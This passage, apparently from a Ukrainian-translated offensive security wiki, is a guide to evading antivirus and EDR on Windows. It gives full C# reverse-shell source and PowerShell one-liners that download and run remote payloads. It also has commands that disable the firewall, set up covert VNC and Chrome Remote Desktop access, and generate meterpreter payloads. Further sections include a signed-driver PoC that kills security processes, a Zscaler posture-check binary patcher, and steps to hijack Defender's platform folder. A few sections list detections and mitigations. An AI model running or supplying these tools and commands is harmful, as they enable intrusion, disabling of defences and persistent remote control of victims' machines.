<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це інструмент, який пакує payload у вихідні контейнери, щоб обійти Mark-of-the-Web.

Приклад використання:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ось демонстрація обходу SmartScreen шляхом пакування payloads усередині ISO-файлів за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм журналювання у Windows, який дає змогу застосункам і системним компонентам **журналювати події**. Однак він також може використовуватися security products для моніторингу та виявлення шкідливої активності.

Так само як вимикається (обходиться) AMSI, можна змусити функцію **`EtwEventWrite`** процесу user space негайно повертати результат без журналювання будь-яких подій. Це робиться шляхом patching функції в пам'яті, щоб вона негайно повертала результат, фактично вимикаючи журналювання ETW для цього процесу.

Більше інформації можна знайти в **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) і [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Завантаження C# binaries у пам'ять відоме вже досить давно й досі є чудовим способом запускати свої post-exploitation tools, не потрапляючи в поле зору AV.

Оскільки payload буде завантажено безпосередньо в пам'ять, не торкаючись диска, нам потрібно буде потурбуватися лише про patching AMSI для всього процесу.

Більшість C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) вже надають можливість виконувати C# assemblies безпосередньо в пам'яті, але існують різні способи це робити:

- **Fork\&Run**

Це передбачає **створення нового sacrificial process**, ін'єкцію вашого шкідливого post-exploitation code у цей новий процес, виконання шкідливого code і завершення нового процесу після завершення. Це має як переваги, так і недоліки. Перевага методу fork and run полягає в тому, що виконання відбувається **за межами** процесу нашого Beacon implant. Це означає, що якщо під час нашої post-exploitation action щось піде не так або буде виявлено, існує **значно вища ймовірність**, що наш **implant виживе.** Недолік полягає в тому, що існує **вища ймовірність** бути виявленим **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Йдеться про ін'єкцію шкідливого post-exploitation code **у власний процес**. Так можна уникнути необхідності створювати новий процес і перевіряти його за допомогою AV, але недоліком є те, що якщо під час виконання вашого payload щось піде не так, існує **значно вища ймовірність** **втратити ваш beacon**, оскільки він може аварійно завершити роботу.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо ви хочете більше дізнатися про завантаження C# Assembly, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати C# Assemblies **з PowerShell** — перегляньте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можна виконувати шкідливий code за допомогою інших мов, надавши compromised machine доступ **до interpreter environment, встановленого на Attacker Controlled SMB share**.

Надавши доступ до Interpreter Binaries та environment на SMB share, можна **виконувати довільний code цими мовами в пам'яті** compromised machine.

У repo зазначено: Defender усе ще сканує scripts, але завдяки використанню Go, Java, PHP тощо ми маємо **більше гнучкості для обходу static signatures**. Тестування випадкових необфускованих reverse shell scripts цими мовами виявилося успішним.

## TokenStomping

Token stomping — це technique, яка дає змогу attacker **маніпулювати access token або security product, наприклад EDR чи AV**, що дозволяє зменшити його privileges, аби процес не завершився, але не мав permissions для перевірки шкідливої активності.

Щоб запобігти цьому, Windows може **перешкоджати external processes** отримувати handles до tokens security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Як описано в [**цьому blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), легко просто розгорнути Chrome Remote Desktop на PC жертви, а потім використовувати його для takeover і підтримання persistence:
1. Завантажте його з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім натисніть MSI-файл для Windows, щоб завантажити MSI-файл.
2. Тихо запустіть installer на victim (потрібні права admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть next. Майстер попросить вас авторизуватися; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте наданий parameter із деякими змінами: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Зверніть увагу на pin param, який дає змогу встановити pin без використання GUI).


## Advanced Evasion

Evasion — дуже складна тема: іноді потрібно враховувати багато різних джерел telemetry в одній системі, тому в зрілих environments практично неможливо залишатися повністю непоміченим.

Кожне environment, проти якого ви дієте, матиме власні сильні та слабкі сторони.

Наполегливо рекомендую переглянути цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати базове розуміння більш Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також ще одна чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Ви можете використовувати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалятиме частини binary**, доки **не визначить, яку частину Defender** вважає шкідливою, і виділить її для вас.\
Інший tool, що виконує **те саме**, — [**avred**](https://github.com/dobin/avred), який має web-сервіс за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 усі версії Windows постачалися з **Telnet server**, який можна було встановити (як administrator), виконавши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Налаштуйте його **запуск** під час запуску системи та **запустіть** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити telnet port** (stealth) і вимкнути firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Завантажте його звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (потрібні завантаження bin, а не setup)

**НА ХОСТІ**: Виконайте _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть параметр _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **жертву**

#### **Зворотне підключення**

**Атакер** повинен **виконати на своєму хості** бінарний файл `vncviewer.exe -listen 5900`, щоб він був **готовий** прийняти зворотне **VNC-підключення**. Потім на **жертві**: запустіть daemon winvnc `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**УВАГА:** Для збереження stealth не слід робити кілька речей

- Не запускайте `winvnc`, якщо він уже працює, інакше з’явиться [popup](https://i.imgur.com/1SROTTl.png). Перевірте, чи він працює, за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тому самому каталозі, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для отримання довідки, інакше з’явиться [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте його звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
У GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний Defender дуже швидко завершить процес.**

### Компіляція власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте це з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# за допомогою компілятора
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список C#-обфускаторів: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання Python для прикладу створення інжекторів:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Знищення AV/EDR з kernel space

Storm-2603 використав невелику консольну утиліту під назвою **Antivirus Terminator**, щоб вимкнути захист кінцевих точок перед розгортанням ransomware. Інструмент містить **власний вразливий, але *підписаний* драйвер** і зловживає ним для виконання привілейованих kernel-операцій, які не можуть заблокувати навіть AV-служби Protected-Process-Light (PPL).

Основні висновки
1. **Підписаний драйвер**: файл, що доставляється на диск, має назву `ServiceMouse.sys`, але двійковий файл є легітимно підписаним драйвером `AToolsKrnl64.sys` з “System In-Depth Analysis Toolkit” від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть тоді, коли ввімкнено Driver-Signature-Enforcement (DSE).
2. **Встановлення service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє драйвер як **kernel service**, а другий запускає його, щоб `\\.\ServiceMouse` став доступним із user land.
3. **IOCTL, які надає драйвер**
| IOCTL code | Можливість                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Завершення довільного process за PID (використовується для завершення служб Defender/EDR) |
| `0x990000D0` | Видалення довільного файлу з диска |
| `0x990001D0` | Вивантаження драйвера та видалення service |

Мінімальний C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Чому це працює**: BYOVD повністю обходить user-mode захист; код, що виконується в kernel, може відкривати *захищені* process, завершувати їх або втручатися в kernel objects незалежно від PPL/PP, ELAM чи інших функцій hardening.

Виявлення / пом'якшення
•  Увімкніть список блокування вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
•  Відстежуйте створення нових *kernel* services і створюйте сповіщення, коли драйвер завантажується зі світового каталогу з правом запису або відсутній у allow-list.
•  Відстежуйте user-mode handles до custom device objects, після яких виконуються підозрілі виклики `DeviceIoControl`.

### Обхід Posture Checks у Zscaler Client Connector за допомогою On-Disk Binary Patching

**Client Connector** від Zscaler локально застосовує правила device-posture і покладається на Windows RPC для передачі результатів іншим компонентам. Два слабкі дизайнерські рішення роблять повний обхід можливим:

1. Оцінювання posture відбувається **повністю на стороні клієнта** (на server передається boolean).
2. Внутрішні RPC endpoints перевіряють лише те, чи підписаний підключений executable **Zscaler** (через `WinVerifyTrust`).

За допомогою **patching чотирьох підписаних binaries на диску** обидва механізми можна нейтралізувати:

| Binary | Вихідна логіка, яку patched | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому кожна перевірка вважається compliant |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | Замінено на NOP ⇒ будь-який (навіть unsigned) process може підключатися до RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks тунелю | Виконання перевірок переривається достроково |

Мінімальний фрагмент patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів і перезапуску стека сервісів:

* **Усі** перевірки стану відображаються як **green/compliant**.
* Непідписані або змінені бінарні файли можуть відкривати кінцеві точки named-pipe RPC (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей приклад демонструє, як рішення щодо довіри, що приймаються винятково на стороні клієнта, і прості перевірки підписів можна обійти за допомогою кількох байтових патчів.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) застосовує ієрархію підписувачів/рівнів, щоб лише захищені процеси з таким самим або вищим рівнем могли втручатися один в одного. В offensive-сценаріях, якщо ви можете легітимно запустити бінарний файл із підтримкою PPL і контролювати його аргументи, ви можете перетворити безпечну функціональність (наприклад, ведення журналу) на обмежений примітив запису з підтримкою PPL для захищених директорій, які використовуються AV/EDR.

Що змушує процес працювати як PPL
- Цільовий EXE (і всі завантажені DLL) має бути підписаний за допомогою EKU із підтримкою PPL.
- Процес має бути створений за допомогою CreateProcess із такими flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запросити сумісний рівень захисту, який відповідає підписувачу бінарного файла (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписувачів anti-malware, `PROTECTION_LEVEL_WINDOWS` для підписувачів Windows). Неправильні рівні призведуть до помилки під час створення.

Також дивіться ширший вступ до PP/PPL і захисту LSASS тут:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти для запуску
- Open-source helper: CreateProcessAsPPL (вибирає рівень захисту та передає аргументи цільовому EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Шаблон використання:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Примітив LOLBIN: ClipUp.exe
- Підписаний системний binary `C:\Windows\System32\ClipUp.exe` запускає себе сам і приймає параметр для запису log file у path, указаний caller.
- Якщо його запущено як PPL process, запис file виконується з підтримкою PPL.
- ClipUp не може обробляти paths, що містять spaces; використовуйте короткі paths 8.3, щоб указати на normally protected locations.

Helpers для коротких paths 8.3
- Перелік short names: `dir /x` у кожному parent directory.
- Отримання short path у cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Запустіть PPL-capable LOLBIN (ClipUp) із `CREATE_PROTECTED_PROCESS`, використовуючи launcher (наприклад, CreateProcessAsPPL).
2) Передайте ClipUp аргумент для log-path, щоб примусово створити file у protected AV directory (наприклад, Defender Platform). За потреби використовуйте short names 8.3.
3) Якщо target binary зазвичай відкритий або locked AV під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час boot, до запуску AV, встановивши auto-start service, який надійно запускається раніше. Перевірте boot ordering за допомогою Process Monitor (boot logging).
4) Після reboot запис із підтримкою PPL виконується до того, як AV заблокує свої binaries, пошкоджуючи target file і перешкоджаючи запуску.

Приклад invocation (paths приховано/скорочено з міркувань безпеки):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Нотатки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp, окрім місця розміщення; primitive придатний для пошкодження, а не для точного впровадження вмісту.
- Потрібні локальні права адміністратора/SYSTEM для встановлення/запуску service і вікно для перезавантаження.
- Час має критичне значення: target не має бути відкритим; виконання під час boot уникає file locks.

Виявлення
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо parent process є нестандартним launcher, поблизу boot.
- Нові services, налаштовані на auto-start підозрілих binaries і такі, що стабільно запускаються до Defender/AV. Досліджуйте створення/модифікацію service перед збоями запуску Defender.
- Моніторинг цілісності файлів для binaries Defender/директорій Platform; неочікуване створення/модифікація файлів процесами з protected-process flags.
- Телеметрія ETW/EDR: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, і аномальне використання рівня PPL небinaries, які не належать AV.

Заходи пом'якшення
- WDAC/Code Integrity: обмежте, які підписані binaries можуть запускатися як PPL і від яких батьківських процесів; блокуйте запуск ClipUp поза легітимними контекстами.
- Гігієна service: обмежте створення/модифікацію auto-start services і контролюйте маніпуляції з порядком запуску.
- Переконайтеся, що tamper protection Defender і early-launch protections увімкнені; досліджуйте помилки запуску, які вказують на пошкодження binary.
- Розгляньте можливість вимкнення генерації коротких імен 8.3 на volumes, де розміщені security tools, якщо це сумісно з вашим середовищем (ретельно протестуйте).

Посилання щодо PPL і tooling
- Огляд Microsoft Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Довідка EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Логування boot у Procmon (перевірка порядку): https://learn.microsoft.com/sysinternals/downloads/procmon
- Launcher CreateProcessAsPPL: https://github.com/2x7EQ13/CreateProcessAsPPL
- Опис техніки (ClipUp + PPL + tamper порядку boot): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender обирає platform, з якої він запускається, шляхом перерахування піддиректорій у:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він обирає піддиректорію з найвищим лексикографічним рядком версії (наприклад, `4.18.25070.5-0`), а потім запускає процеси service Defender звідти (відповідно оновлюючи шляхи service/registry). Цей вибір довіряє directory entries, зокрема directory reparse points (symlinks). Адміністратор може використати це для перенаправлення Defender на шлях, доступний для запису attacker, і досягнення DLL sideloading або disruption service.

Передумови
- Local Administrator (потрібен для створення директорій/symlinks у папці Platform)
- Можливість перезавантажити систему або ініціювати повторний вибір platform Defender (restart service під час boot)
- Потрібні лише вбудовані tools (`mklink`)

Чому це працює
- Defender блокує записи у власні папки, але вибір platform довіряє directory entries і вибирає лексикографічно найвищу версію без перевірки, чи target вказує на захищений/trusted шлях.

Покроково (приклад)
1) Підготуйте доступний для запису clone поточної папки platform, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть символічне посилання на каталог із вищою версією всередині Platform, яке вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендовано перезавантаження):
```cmd
shutdown /r /t 0
```
4) Перевірте, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Слід спостерігати за шляхом нового процесу в `C:\TMP\AV\` і конфігурацією служби/реєстру, що вказує на це розташування.

Варіанти post-exploitation
- DLL sideloading/code execution: Розміщуйте/замінюйте DLL, які Defender завантажує з каталогу свого застосунку, щоб виконати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Видаліть version-symlink, щоб під час наступного запуску налаштований шлях не розв’язався і Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Зверніть увагу: ця technique сама по собі не забезпечує privilege escalation; для її використання потрібні admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть перемістити runtime evasion із C2 implant безпосередньо в target module, підключивши його Import Address Table (IAT) і спрямувавши вибрані APIs через attacker-controlled, position-independent code (PIC). Це узагальнює evasion за межами невеликої API surface, яку надають багато kits (наприклад, CreateProcessA), і поширює ті самі protections на BOFs та post-exploitation DLLs.

Підхід високого рівня
- Розмістити PIC blob поруч із target module за допомогою reflective loader (у prepended або companion-варіанті). PIC має бути self-contained і position-independent.
- Під час завантаження host DLL пройтися по його IMAGE_IMPORT_DESCRIPTOR і змінити записи IAT для цільових imports (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC wrappers.
- Кожен PIC wrapper виконує evasions перед tail-calling реального API address. Типові evasions включають:
- Memory mask/unmask навколо виклику (наприклад, encrypt beacon regions, RWX→RX, змінити page names/permissions), а потім відновити стан після виклику.
- Call-stack spoofing: створити benign stack і виконати перехід у target API, щоб call-stack analysis визначав очікувані frames.
- Для сумісності експортувати interface, щоб Aggressor script (або equivalent) міг реєструвати APIs, які потрібно hook для Beacon, BOFs і post-ex DLLs.

Чому тут використовується IAT hooking
- Працює з будь-яким code, який використовує hooked import, без modification tool code або залежності від Beacon для proxy конкретних APIs.
- Охоплює post-ex DLLs: hooking LoadLibrary* дає змогу intercept module loads (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати ті самі masking/stack evasion до їхніх API calls.
- Відновлює надійне використання post-ex commands для process-spawning проти detections, заснованих на call stack, обгортаючи CreateProcessA/W.

Мінімальний IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Нотатки
- Застосовуйте патч після relocations/ASLR і перед першим використанням імпорту. Reflective loaders на кшталт TitanLdr/AceLdr демонструють hooking під час DllMain завантаженого модуля.
- Робіть wrappers мінімальними та PIC-safe; визначайте справжній API через оригінальне значення IAT, захоплене до патчингу, або через LdrGetProcedureAddress.
- Використовуйте переходи RW → RX для PIC і не залишайте сторінки одночасно writable+executable.

Call‑stack spoofing stub
- PIC stubs у стилі Draugr створюють фальшивий ланцюжок викликів (return addresses у benign modules), а потім передають керування справжньому API.
- Це обходить detections, які очікують canonical stacks від Beacon/BOFs до sensitive APIs.
